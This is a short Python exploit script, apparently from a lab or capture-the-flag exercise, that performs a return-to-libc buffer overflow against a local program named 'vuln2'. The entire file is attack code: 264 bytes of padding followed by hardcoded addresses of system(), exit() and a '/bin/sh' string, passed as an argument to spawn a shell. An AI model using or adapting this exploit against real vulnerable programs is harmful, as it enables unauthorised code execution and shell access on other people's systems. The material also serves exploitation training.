#!/usr/bin/env python

import struct
import subprocess

eip_addr = hex(0xbfffef10 +0x0000000c)

libc_address = 0xb7c00000 # not necessary anymore
# Used gdbs info address to get the addresses directly

system_address = 0xb7c4c80b

exit_address = 0xb7c3bc90

bin_sh_address = 0xb7db5faa

buf = "A" * 264
buf += struct.pack("<I",system_address)
buf += struct.pack("<I",exit_address)
buf += struct.pack("<I",bin_sh_address)

subprocess.call(["./vuln2", buf])

